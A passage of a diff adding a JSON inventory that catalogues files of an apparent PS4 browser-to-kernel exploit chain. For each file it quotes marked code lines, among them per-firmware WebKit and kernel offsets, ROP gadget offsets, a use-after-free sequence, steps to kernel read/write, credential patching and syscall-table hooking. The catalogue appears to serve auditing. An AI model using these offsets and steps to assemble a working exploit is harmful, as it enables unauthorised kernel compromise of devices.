+          "text": "throw new SyscallError(`Unable to close fd ${sock} !!`);"
+        },
+        {
+          "line": 369,
+          "text": "throw new SyscallError(`Unable to close fd ${sock} !!`);"
+        },
+        {
+          "line": 415,
+          "text": "throw new SyscallError(`Unable to close fd ${dummy_sock} !!`);"
+        },
+        {
+          "line": 420,
+          "text": "throw new SyscallError(\"Unable to set uid to 1 !!\");"
+        },
+        {
+          "line": 433,
+          "text": "throw new SyscallError(\"Unable to set uid to 1 !!\");"
+        },
+        {
+          "line": 450,
+          "text": "throw new SyscallError(`Unable to duplicate fd ${uaf_sock} !!`);"
+        },
+        {
+          "line": 454,
+          "text": "throw new SyscallError(`Unable to close fd ${uaf_sock_dup} !!`);"
+        },
+        {
+          "line": 483,
+          "text": "throw new SyscallError(\"Unable to yield scheduler !!\");"
+        },
+        {
+          "line": 497,
+          "text": "throw new SyscallError(`Unable to write to fd ${iov_ss[1]} !!`);"
+        },
+        {
+          "line": 503,
+          "text": "throw new SyscallError(`Unable to write to fd ${iov_ss[0]} !!`);"
+        },
+        {
+          "line": 518,
+          "text": "throw new SyscallError(`Unable to duplicate fd ${uaf_sock} !!`);"
+        },
+        {
+          "line": 522,
+          "text": "throw new SyscallError(`Unable to close fd ${uaf_sock_dup} !!`);"
+        },
+        {
+          "line": 532,
+          "text": "throw new SyscallError(`Unable to write to fd ${iov_ss[1]} !!`);"
+        },
+        {
+          "line": 540,
+          "text": "throw new SyscallError(`Unable to write to fd ${iov_ss[0]} !!`);"
+        },
+        {
+          "line": 549,
+          "text": "if (err.name === \"SyscallError\") {"
+        },
+        {
+          "line": 563,
+          "text": "throw new SyscallError(`Unable to close fd ${uaf_sock} !!`);"
+        },
+        {
+          "line": 583,
+          "text": "throw new SyscallError(\"Unable to get kqueue !!\");"
+        },
+        {
+          "line": 596,
+          "text": "throw new SyscallError(`Unable to close fd ${kq} !!`);"
+        },
+        {
+          "line": 608,
+          "text": "kernel_base = kl_lock.sub(constants.KL_LOCK);"
+        },
+        {
+          "line": 613,
+          "text": "logger.info(`kernel base: ${kernel_base}`);"
+        },
+        {
+          "line": 617,
+          "text": "throw new SyscallError(`Unable to close fd ${kq} !!`);"
+        },
+        {
+          "line": 640,
+          "text": "throw new SyscallError(`Unable to set socket option for fd ${uio_ss[1]} !!`);"
+        },
+        {
+          "line": 647,
+          "text": "throw new SyscallError(`Unable to write to fd ${uio_ss[1]} !!`);"
+        },
+        {
+          "line": 667,
+          "text": "throw new SyscallError(\"Unable to yield scheduler !!\");"
+        },
+        {
+          "line": 682,
+          "text": "throw new SyscallError(`Unable to read from fd ${uio_ss[0]} !!`);"
+        },
+        {
+          "line": 687,
+          "text": "throw new SyscallError(`Unable to read from fd ${uio_ss[0]} !!`);"
+        },
+        {
+          "line": 695,
+          "text": "throw new SyscallError(`Unable to write to fd ${uio_ss[1]} !!`);"
+        },
+        {
+          "line": 710,
+          "text": "msg_uio.uio_offset = -1;"
+        },
+        {
+          "line": 734,
+          "text": "throw new SyscallError(\"Unable to yield scheduler !!\");"
+        },
+        {
+          "line": 749,
+          "text": "throw new SyscallError(`Unable to write to fd ${iov_ss[1]} !!`);"
+        },
+        {
+          "line": 755,
+          "text": "throw new SyscallError(`Unable to write to fd ${iov_ss[0]} !!`);"
+        },
+        {
+          "line": 767,
+          "text": "throw new SyscallError(`Unable to read from fd ${uio_ss[0]} !!`);"
+        },
+        {
+          "line": 777,
+          "text": "throw new SyscallError(`Unable to read from fd ${uio_ss[0]} !!`);"
+        },
+        {
+          "line": 795,
+          "text": "throw new SyscallError(`Unable to write to fd ${iov_ss[1]} !!`);"
+        },
+        {
+          "line": 803,
+          "text": "throw new SyscallError(`Unable to write to fd ${iov_ss[0]} !!`);"
+        },
+        {
+          "line": 822,
+          "text": "throw new SyscallError(`Unable to set socket option for fd ${uio_ss[1]} !!`);"
+        },
+        {
+          "line": 844,
+          "text": "throw new SyscallError(\"Unable to yield scheduler !!\");"
+        },
+        {
+          "line": 860,
+          "text": "throw new SyscallError(`Unable to read from fd ${uio_ss[1]} !!`);"
+        },
+        {
+          "line": 878,
+          "text": "msg_uio.uio_offset = -1;"
+        },
+        {
+          "line": 902,
+          "text": "throw new SyscallError(\"Unable to yield scheduler !!\");"
+        },
+        {
+          "line": 917,
+          "text": "throw new SyscallError(`Unable to write to fd ${iov_ss[1]} !!`);"
+        },
+        {
+          "line": 923,
+          "text": "throw new SyscallError(`Unable to write to fd ${iov_ss[0]} !!`);"
+        },
+        {
+          "line": 936,
+          "text": "throw new SyscallError(`Unable to read from fd ${uio_ss[1]} !!`);"
+        },
+        {
+          "line": 946,
+          "text": "throw new SyscallError(`Unable to write to fd ${iov_ss[1]} !!`);"
+        },
+        {
+          "line": 954,
+          "text": "throw new SyscallError(`Unable to write to fd ${iov_ss[0]} !!`);"
+        },
+        {
+          "line": 994,
+          "text": "logger.info(\"Initiate kernel ARW...\");"
+        },
+        {
+          "line": 1023,
+          "text": "kv = new KernelView(master_pipe, slave_pipe);"
+        },
+        {
+          "line": 1025,
+          "text": "logger.info(\"Achieved kernel ARW !!\");"
+        },
+        {
+          "line": 1047,
+          "text": "{ type: \"Uint64\", name: \"uio_offset\" },"
+        }
+      ],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": "public/src/ps4/constants.js",
+      "size": 24540,
+      "sha256": "c832a6f7ba08b729a291a5807caf5f2caffac52823e32ca8bca6dbba3252e329",
+      "category": "EXPLOIT_CHAIN_REFERENCE_ONLY",
+      "marker_count": 91,
+      "markers": [
+        {
+          "line": 5,
+          "text": "wk_CSSFontFace_sizeof: 0x128,"
+        },
+        {
+          "line": 6,
+          "text": "wk_CSSFontFace_m_families: 0x10,"
+        },
+        {
+          "line": 7,
+          "text": "wk_CSSFontFace_m_featureSettings_m_buffer: 0x28,"
+        },
+        {
+          "line": 8,
+          "text": "wk_CSSFontFace_m_featureSettings_m_size: 0x30,"
+        },
+        {
+          "line": 9,
+          "text": "wk_CSSFontFace_m_featureSettings_m_capacity: 0x34,"
+        },
+        {
+          "line": 10,
+          "text": "wk_CSSFontFace_m_clients: 0xe8,"
+        },
+        {
+          "line": 11,
+          "text": "wk_CSSFontFace_m_wrapper: 0x100,"
+        },
+        {
+          "line": 12,
+          "text": "wk_CSSFontFace_m_status: 0x120,"
+        },
+        {
+          "line": 13,
+          "text": "wk_CSSFontFace_m_thread: 0xb0,"
+        },
+        {
+          "line": 14,
+          "text": "wk_CSSFontFace_m_function: 0xb8,"
+        },
+        {
+          "line": 15,
+          "text": "wk_CSSFontFace_vtable: 0x223e480,"
+        },
+        {
+          "line": 69,
+          "text": "KPATCH: \"600.bin\","
+        },
+        {
+          "line": 71,
+          "text": "JMP_RSI_GADGET: 0x3f0c9,"
+        },
+        {
+          "line": 72,
+          "text": "EVF_OFFSET: 0x7c8971,"
+        },
+        {
+          "line": 92,
+          "text": "KPATCH: \"620.bin\","
+        },
+        {
+          "line": 94,
+          "text": "JMP_RSI_GADGET: 0x2be6e,"
+        },
+        {
+          "line": 95,
+          "text": "EVF_OFFSET: 0x7c8e31,"
+        },
+        {
+          "line": 98,
+          "text": "wk_CSSFontFace_sizeof: 0x120,"
+        },
+        {
+          "line": 99,
+          "text": "wk_CSSFontFace_m_clients: 0xd8,"
+        },
+        {
+          "line": 100,
+          "text": "wk_CSSFontFace_m_wrapper: 0xe0,"
+        },
+        {
+          "line": 101,
+          "text": "wk_CSSFontFace_m_status: 0x118,"
+        },
+        {
+          "line": 142,
+          "text": "KPATCH: \"650.bin\","
+        },
+        {
+          "line": 144,
+          "text": "JMP_RSI_GADGET: 0x15a50d,"
+        },
+        {
+          "line": 145,
+          "text": "EVF_OFFSET: 0x7c6019,"
+        },
+        {
+          "line": 148,
+          "text": "EVF_OFFSET: 0x7c6099,"
+        },
+        {
+          "line": 151,
+          "text": "KPATCH: \"670.bin\","
+        },
+        {
+          "line": 153,
+          "text": "JMP_RSI_GADGET: 0x9d11d,"
+        },
+        {
+          "line": 154,
+          "text": "EVF_OFFSET: 0x7c7829,"
+        },
+        {
+          "line": 159,
+          "text": "wk_CSSFontFace_sizeof: 0xe8,"
+        },
+        {
+          "line": 160,
+          "text": "wk_CSSFontFace_m_clients: 0x68,"
+        },
+        {
+          "line": 161,
+          "text": "wk_CSSFontFace_m_wrapper: 0x80,"
+        },
+        {
+          "line": 162,
+          "text": "wk_CSSFontFace_m_status: 0x9a,"
+        },
+        {
+          "line": 163,
+          "text": "wk_CSSFontFace_m_thread: 0xd8,"
+        },
+        {
+          "line": 164,
+          "text": "wk_CSSFontFace_m_function: 0xe0,"
+        },
+        {
+          "line": 165,
+          "text": "wk_CSSFontFace_vtable: 0x23927c0,"
+        },
+        {
+          "line": 210,
+          "text": "KPATCH: \"700.bin\","
+        },
+        {
+          "line": 212,
+          "text": "JMP_RSI_GADGET: 0x6b192,"
+        },
+        {
+          "line": 213,
+          "text": "EVF_OFFSET: 0x7f92cb,"
+        },
+        {
+          "line": 253,
+          "text": "KPATCH: \"750.bin\","
+        },
+        {
+          "line": 255,
+          "text": "JMP_RSI_GADGET: 0x1f842,"
+        },
+        {
+          "line": 256,
+          "text": "EVF_OFFSET: 0x79a92e,"
+        },
+        {
+          "line": 259,
+          "text": "EVF_OFFSET: 0x79a96e,"
+        },
+        {
+          "line": 302,
+          "text": "KPATCH: \"800.bin\","
+        },
+        {
+          "line": 304,
+          "text": "JMP_RSI_GADGET: 0xe629c,"
+        },
+        {
+          "line": 305,
+          "text": "EVF_OFFSET: 0x7edcff,"
+        },
+        {
+          "line": 308,
+          "text": "wk_CSSFontFace_vtable: 0x2345b60,"
+        },
+        {
+          "line": 344,
+          "text": "KPATCH: \"850.bin\","
+        },
+        {
+          "line": 346,
+          "text": "JMP_RSI_GADGET: 0xc810d,"
+        },
+        {
+          "line": 347,
+          "text": "EVF_OFFSET: 0x7da91c,"
+        },
+        {
+          "line": 352,
+          "text": "wk_CSSFontFace_sizeof: 0xb8,"
+        },
+        {
+          "line": 353,
+          "text": "wk_CSSFontFace_m_clients: 0x60,"
+        },
+        {
+          "line": 354,
+          "text": "wk_CSSFontFace_m_wrapper: 0x68,"
+        },
+        {
+          "line": 355,
+          "text": "wk_CSSFontFace_m_status: 0x82,"
+        },
+        {
+          "line": 356,
+          "text": "wk_CSSFontFace_m_thread: 0xa8,"
+        },
+        {
+          "line": 357,
+          "text": "wk_CSSFontFace_m_function: 0xb0,"
+        },
+        {
+          "line": 358,
+          "text": "wk_CSSFontFace_vtable: 0x2e48f98,"
+        },
+        {
+          "line": 407,
+          "text": "KPATCH: \"900.bin\","
+        },
+        {
+          "line": 409,
+          "text": "JMP_RSI_GADGET: 0x4c7ad,"
+        },
+        {
+          "line": 411,
+          "text": "EVF_OFFSET: 0x7f6f27,"
+        },
+        {
+          "line": 414,
+          "text": "KPATCH: \"903.bin\","
+        },
+        {
+          "line": 416,
+          "text": "JMP_RSI_GADGET: 0x5325b,"
+        },
+        {
+          "line": 418,
+          "text": "EVF_OFFSET: 0x7f4ce7,"
+        },
+        {
+          "line": 421,
+          "text": "wk_CSSFontFace_vtable: 0x2e93e78,"
+        },
+        {
+          "line": 459,
+          "text": "KPATCH: \"950.bin\","
+        },
+        {
+          "line": 461,
+          "text": "JMP_RSI_GADGET: 0x15a6d,"
+        },
+        {
+          "line": 463,
+          "text": "EVF_OFFSET: 0x769a88,"
+        },
+        {
+          "line": 468,
+          "text": "wk_CSSFontFace_m_clients: 0x58,"
+        },
+        {
+          "line": 469,
+          "text": "wk_CSSFontFace_m_wrapper: 0x60,"
+        },
+        {
+          "line": 470,
+          "text": "wk_CSSFontFace_m_status: 0x7a,"
+        },
+        {
+          "line": 471,
+          "text": "wk_CSSFontFace_vtable: 0x3617a38,"
+        },
+        {
+          "line": 511,
+          "text": "KPATCH: \"1000.bin\","
+        },
+        {
+          "line": 513,
+          "text": "JMP_RSI_GADGET: 0x68b1,"
+        },
+        {
+          "line": 515,
+          "text": "EVF_OFFSET: 0x7b5133,"
+        },
+        {
+          "line": 518,
+          "text": "wk_CSSFontFace_vtable: 0x361ba28,"
+        },
+        {
+          "line": 555,
+          "text": "KPATCH: \"1050.bin\","
+        },
+        {
+          "line": 557,
+          "text": "JMP_RSI_GADGET: 0x50ded,"
+        },
+        {
+          "line": 559,
+          "text": "EVF_OFFSET: 0x7a7b14,"
+        },
+        {
+          "line": 564,
+          "text": "wk_CSSFontFace_vtable: 0x3627aa8,"
+        },
+        {
+          "line": 600,
+          "text": "KPATCH: \"1100.bin\","
+        },
+        {
+          "line": 602,
+          "text": "JMP_RSI_GADGET: 0x71a21,"
+        },
+        {
+          "line": 604,
+          "text": "EVF_OFFSET: 0x7fc26f,"
+        },
+        {
+          "line": 621,
+          "text": "KPATCH: \"1102.bin\","
+        },
+        {
+          "line": 622,
+          "text": "EVF_OFFSET: 0x7fc22f,"
+        },
+        {
+          "line": 628,
+          "text": "get(target, prop) {"
+        },
+        {
+          "line": 629,
+          "text": "if (constants_cache.has(prop)) {"
+        },
+        {
+          "line": 630,
+          "text": "return constants_cache.get(prop);"
+        },
+        {
+          "line": 636,
+          "text": "if (minor in target[major] && prop in target[major][minor]) {"
+        },
+        {
+          "line": 637,
+          "text": "const value = target[major][minor][prop];"
+        },
+        {
+          "line": 639,
+          "text": "throw new Error(`${prop} offset is not supported for ${version}`);"
+        },
+        {
+          "line": 642,
+          "text": "constants_cache.set(prop, value);"
+        },
+        {
+          "line": 649,
+          "text": "throw new Error(`${version} has no ${prop} !!`);"
+        }
+      ],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": "public/src/ps4/kernel.js",
+      "size": 17818,
+      "sha256": "bb184cf282dcb9c94aec0a39306e93923ece1b549f847010fc8eb1fe0468ff33",
+      "category": "EXPLOIT_CHAIN_REFERENCE_ONLY",
+      "marker_count": 73,
+      "markers": [
+        {
+          "line": 2,
+          "text": "const KERNEL_PID = 0;"
+        },
+        {
+          "line": 55,
+          "text": "let kernel_base = undefined;"
+        },
+        {
+          "line": 74,
+          "text": "class KernelView {"
+        },
+        {
+          "line": 89,
+          "text": "throw new SyscallError(`Unable to fcntl fd ${this.master_pipe[0]}`);"
+        },
+        {
+          "line": 93,
+          "text": "throw new SyscallError(`Unable to fcntl fd ${this.master_pipe[1]}`);"
+        },
+        {
+          "line": 97,
+          "text": "throw new SyscallError(`Unable to fcntl fd ${this.slave_pipe[0]}`);"
+        },
+        {
+          "line": 101,
+          "text": "throw new SyscallError(`Unable to fcntl fd ${this.slave_pipe[1]}`);"
+        },
+        {
+          "line": 142,
+          "text": "throw new SyscallError(`Unable to write to fd ${this.master_pipe[1]} !!`);"
+        },
+        {
+          "line": 146,
+          "text": "throw new SyscallError(`Unable to read from fd ${this.master_pipe[0]} !!`);"
+        },
+        {
+          "line": 157,
+          "text": "throw new SyscallError(`Unable to read from fd ${this.slave_pipe[0]} !!`);"
+        },
+        {
+          "line": 170,
+          "text": "throw new SyscallError(`Unable to write to fd ${this.slave_pipe[1]} !!`);"
+        },
+        {
+          "line": 176,
+          "text": "getFloat32(byteOffset, littleEndian = false) {"
+        },
+        {
+          "line": 179,
+          "text": "this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 4);"
+        },
+        {
+          "line": 184,
+          "text": "getFloat64(byteOffset, littleEndian = false) {"
+        },
+        {
+          "line": 185,
+          "text": "this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 8);"
+        },
+        {
+          "line": 190,
+          "text": "getInt8(byteOffset) {"
+        },
+        {
+          "line": 193,
+          "text": "this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 1);"
+        },
+        {
+          "line": 198,
+          "text": "getInt16(byteOffset, littleEndian = false) {"
+        },
+        {
+          "line": 201,
+          "text": "this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 2);"
+        },
+        {
+          "line": 206,
+          "text": "getInt32(byteOffset, littleEndian = false) {"
+        },
+        {
+          "line": 209,
+          "text": "this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 4);"
+        },
+        {
+          "line": 214,
+          "text": "getUint8(byteOffset) {"
+        },
+        {
+          "line": 217,
+          "text": "this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 1);"
+        },
+        {
+          "line": 222,
+          "text": "getUint16(byteOffset, littleEndian = false) {"
+        },
+        {
+          "line": 225,
+          "text": "this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 2);"
+        },
+        {
+          "line": 230,
+          "text": "getUint32(byteOffset, littleEndian = false) {"
+        },
+        {
+          "line": 233,
+          "text": "this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 4);"
+        },
+        {
+          "line": 238,
+          "text": "getBInt(byteOffset, littleEndian = false) {"
+        },
+        {
+          "line": 239,
+          "text": "this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 8);"
+        },
+        {
+          "line": 244,
+          "text": "setFloat32(byteOffset, value, littleEndian = false) {"
+        },
+        {
+          "line": 248,
+          "text": "this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 4);"
+        },
+        {
+          "line": 251,
+          "text": "setFloat64(byteOffset, value, littleEndian = false) {"
+        },
+        {
+          "line": 252,
+          "text": "this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 8);"
+        },
+        {
+          "line": 255,
+          "text": "setInt8(byteOffset, value) {"
+        },
+        {
+          "line": 259,
+          "text": "this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 1);"
+        },
+        {
+          "line": 262,
+          "text": "setInt16(byteOffset, value, littleEndian = false) {"
+        },
+        {
+          "line": 266,
+          "text": "this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 2);"
+        },
+        {
+          "line": 269,
+          "text": "setInt32(byteOffset, value, littleEndian = false) {"
+        },
+        {
+          "line": 273,
+          "text": "this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 4);"
+        },
+        {
+          "line": 276,
+          "text": "setUint8(byteOffset, value) {"
+        },
+        {
+          "line": 280,
+          "text": "this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 1);"
+        },
+        {
+          "line": 283,
+          "text": "setUint16(byteOffset, value, littleEndian = false) {"
+        },
+        {
+          "line": 287,
+          "text": "this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 2);"
+        },
+        {
+          "line": 290,
+          "text": "setUint32(byteOffset, value, littleEndian = false) {"
+        },
+        {
+          "line": 294,
+          "text": "this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 4);"
+        },
+        {
+          "line": 297,
+          "text": "setBInt(byteOffset, value, littleEndian = false) {"
+        },
+        {
+          "line": 300,
+          "text": "this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 8);"
+        },
+        {
+          "line": 311,
+          "text": "throw new SyscallError(`Unable to setaffinity to core ${core}`);"
+        },
+        {
+          "line": 324,
+          "text": "throw new SyscallError(`Unable to set priority to ${value}`);"
+        },
+        {
+          "line": 347,
+          "text": "throw new SyscallError(`Unable to get socket option for fd ${sock} !!`);"
+        },
+        {
+          "line": 359,
+          "text": "throw new SyscallError(`Unable to set socket option for fd ${sock} !!`);"
+        },
+        {
+          "line": 365,
+          "text": "throw new SyscallError(`Unable to set socket option for fd ${sock} !!`);"
+        },
+        {
+          "line": 372,
+          "text": "throw new SyscallError(\"Unable to create socket !!\");"
+        },
+        {
+          "line": 383,
+          "text": "throw new SyscallError(\"Unable to create pipe !!\");"
+        },
+        {
+          "line": 390,
+          "text": "throw new SyscallError(\"Unable to create pipe !!\");"
+        },
+        {
+          "line": 410,
+          "text": "throw new SyscallError(`Unable to close fd ${fd} !!`);"
+        },
+        {
+          "line": 420,
+          "text": "throw new SyscallError(`Unable to close fd ${fd} !!`);"
+        },
+        {
+          "line": 497,
+          "text": "throw new SyscallError(\"Unable to create pipe !!\");"
+        },
+        {
+          "line": 511,
+          "text": "throw new SyscallError(`Unable to ioctl fd ${tmp_pipe[0]} !!`);"
+        },
+        {
+          "line": 535,
+          "text": "throw new SyscallError(`Unable to close fd ${fd} !!`);"
+        },
+        {
+          "line": 545,
+          "text": "const kp = pfind(KERNEL_PID);"
+        },
+        {
+          "line": 547,
+          "text": "// Patch credentials and capabilities"
+        },
+        {
+          "line": 577,
+          "text": "// intended for use only after kernel arw"
+        },
+        {
+          "line": 578,
+          "text": "function kernel_patches(shellcode) {"
+        },
+        {
+          "line": 579,
+          "text": "logger.info(\"Applying kernel patches...\");"
+        },
+        {
+          "line": 581,
+          "text": "const sysent_661_addr = kernel_base.add(constants.SYSENT_661);"
+        },
+        {
+          "line": 584,
+          "text": "const jmp_rsi_gadget_addr = kernel_base.add(constants.JMP_RSI_GADGET);"
+        },
+        {
+          "line": 585,
+          "text": "logger.debug(`jmp_rsi_gadget_addr: ${jmp_rsi_gadget_addr}`);"
+        },
+        {
+          "line": 596,
+          "text": "kview(sysent_661_addr).setBInt(8, jmp_rsi_gadget_addr, true);"
+        },
+        {
+          "line": 606,
+          "text": "throw new SyscallError(\"Unablet to create JIT shared memory with rwx !!\");"
+        },
+        {
+          "line": 612,
+          "text": "throw new SyscallError(`Unable to map memory with size ${size} with rwx !!`);"
+        },
+        {
+          "line": 620,
+          "text": "throw new SyscallError(`Unable to kexec ${mapping_addr} !!`);"
+        },
+        {
+          "line": 627,
+          "text": "logger.info(\"Kernel patches applied !!\");"
+        }
+      ],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": "public/src/ps4/patches/1000.bin",
+      "size": 589,
+      "sha256": "954ff624c9c92ab991c3e92a93fde1583da291dfd9674e245354c7efdcd07cf8",
+      "category": "HISTORICAL_BINARY_PATCH_METADATA_ONLY",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": "public/src/ps4/patches/1050.bin",
+      "size": 632,
+      "sha256": "fbf815d2d47a707cf788815ef11558fa6d8f718e628d508e8540417083c55e1f",
+      "category": "HISTORICAL_BINARY_PATCH_METADATA_ONLY",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": "public/src/ps4/patches/1100.bin",
+      "size": 632,
+      "sha256": "15497a2b748dafd49bfb89c51ed048d0c5ba3c5092c5254da46dd4443f80983b",
+      "category": "HISTORICAL_BINARY_PATCH_METADATA_ONLY",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": "public/src/ps4/patches/1102.bin",
+      "size": 632,
+      "sha256": "4634f7bcdaeea7a48307a6b0c2f0575dc131d4fcf15138c6678f18b4f19058fd",
+      "category": "HISTORICAL_BINARY_PATCH_METADATA_ONLY",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": "public/src/ps4/patches/600.bin",
+      "size": 245,
+      "sha256": "0926e4aad37d12795826c01c0341aac1e67daaa5d346d37a2f6179366a12eee0",
+      "category": "HISTORICAL_BINARY_PATCH_METADATA_ONLY",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": "public/src/ps4/patches/620.bin",
+      "size": 245,
+      "sha256": "e239de491039a189983157be063b99270b6834bcfeb8fe62092168b9c8ab4360",
+      "category": "HISTORICAL_BINARY_PATCH_METADATA_ONLY",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": "public/src/ps4/patches/650.bin",
+      "size": 285,
+      "sha256": "1083e8b16f1c3dbc26c94cd594a41e36642651fd400b19d7e57994fd37cba070",
+      "category": "HISTORICAL_BINARY_PATCH_METADATA_ONLY",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": "public/src/ps4/patches/670.bin",
+      "size": 285,
+      "sha256": "589afd201592ccefab68e460297f625ee8826fdab7a982e32c3550643903e171",
+      "category": "HISTORICAL_BINARY_PATCH_METADATA_ONLY",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": "public/src/ps4/patches/700.bin",
+      "size": 427,
+      "sha256": "b2793ae0c589b0746964693a5ab1795ff2516b5fcac6fa2e493814ce677b0cb7",
+      "category": "HISTORICAL_BINARY_PATCH_METADATA_ONLY",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": "public/src/ps4/patches/750.bin",
+      "size": 606,
+      "sha256": "70bb383269face27d5203be7aa83d0d184fd7f94b31f2403328b8cb733cc5b41",
+      "category": "HISTORICAL_BINARY_PATCH_METADATA_ONLY",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": "public/src/ps4/patches/800.bin",
+      "size": 589,
+      "sha256": "aa30be1ce005f10d6fdae3357e07c073bde4e0e1072514d324e1e6f71b660b2c",
+      "category": "HISTORICAL_BINARY_PATCH_METADATA_ONLY",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": "public/src/ps4/patches/850.bin",
+      "size": 589,
+      "sha256": "889aeea9e4d4316ca1cbbb49066faac85e90c3b0fc5bbea2126c6eac57ca977c",
+      "category": "HISTORICAL_BINARY_PATCH_METADATA_ONLY",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": "public/src/ps4/patches/900.bin",
+      "size": 589,
+      "sha256": "1645039fd48ec3f9b4fbbbb92daf7df5faf41e6bb8d815b4a8edb27f35fd9ae4",
+      "category": "HISTORICAL_BINARY_PATCH_METADATA_ONLY",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": "public/src/ps4/patches/903.bin",
+      "size": 589,
+      "sha256": "779a980d04afc6dc89ff6b77af058636904b3559734f9efe3c1d46d20dc14a73",
+      "category": "HISTORICAL_BINARY_PATCH_METADATA_ONLY",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": "public/src/ps4/patches/950.bin",
+      "size": 589,
+      "sha256": "d3d536b07cf9f07d91a18472255f71d83233d6b094628ced474477cd8b912608",
+      "category": "HISTORICAL_BINARY_PATCH_METADATA_ONLY",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": "public/src/ps4/userland.js",
+      "size": 37526,
+      "sha256": "dc1ae1fd99829511818dd0ecde813e75287f804b4543af4186d09ab875d5c2a4",
+      "category": "EXPLOIT_CHAIN_REFERENCE_ONLY",
+      "marker_count": 174,
+      "markers": [
+        {
+          "line": 2,
+          "text": "// used for rop"
+        },
+        {
+          "line": 5,
+          "text": "const syscalls = new Map();"
+        },
+        {
+          "line": 12,
+          "text": "let webkit_base = undefined;"
+        },
+        {
+          "line": 14,
+          "text": "let libkernel_base = undefined;"
+        },
+        {
+          "line": 29,
+          "text": "if (ab.hasOwnProperty(\"m_data\")) {"
+        },
+        {
+          "line": 97,
+          "text": "const rop = {"
+        },
+        {
+          "line": 107,
+          "text": "rop.frame.set_value(\"jmp_rax\", gadgets.POP_RAX_RET);"
+        },
+        {
+          "line": 125,
+          "text": "const gadgets = new Proxy(constants, {"
+        },
+        {
+          "line": 126,
+          "text": "get(target, prop) {"
+        },
+        {
+          "line": 127,
+          "text": "return webkit_base + target[`wk_${prop}`];"
+        },
+        {
+          "line": 132,
+          "text": "class SyscallError extends Error {"
+        },
+        {
+          "line": 135,
+          "text": "this.name = \"SyscallError\";"
+        },
+        {
+          "line": 145,
+          "text": "throw new Error(\"Invalid stack size, minimal size is 0x1000 to init ROP\");"
+        },
+        {
+          "line": 154,
+          "text": "this.offset = this.view.byteLength;"
+        },
+        {
+          "line": 158,
+          "text": "return this.view.buffer.data().add(this.offset);"
+        },
+        {
+          "line": 183,
+          "text": "this.offset -= 8;"
+        },
+        {
+          "line": 184,
+          "text": "this.view.setBInt(this.offset, inst, true);"
+        },
+        {
+          "line": 268,
+          "text": "insts.push(gadgets.POP_RDI_RET);"
+        },
+        {
+          "line": 270,
+          "text": "insts.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);"
+        },
+        {
+          "line": 278,
+          "text": "insts.push(gadgets.POP_RDI_RET);"
+        },
+        {
+          "line": 280,
+          "text": "insts.push(gadgets.MOV_RAX_QWORD_PTR_RDI_RET);"
+        },
+        {
+          "line": 283,
+          "text": "pop(insts, gadget, name) {"
+        },
+        {
+          "line": 288,
+          "text": "insts.push(gadgets.POP_RAX_RET);"
+        },
+        {
+          "line": 289,
+          "text": "insts.push(gadget);"
+        },
+        {
+          "line": 290,
+          "text": "insts.push(gadgets.POP_RDI_RET);"
+        },
+        {
+          "line": 292,
+          "text": "insts.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);"
+        },
+        {
+          "line": 294,
+          "text": "insts.push(gadgets.POP_RBX_RET);"
+        },
+        {
+          "line": 296,
+          "text": "insts.push(gadgets.POP_RAX_RET);"
+        },
+        {
+          "line": 298,
+          "text": "insts.push(gadgets.PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX);"
+        },
+        {
+          "line": 306,
+          "text": "this.store_view.setBInt(constants.store_view_entry, gadgets.POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_18, true);"
+        },
+        {
+          "line": 307,
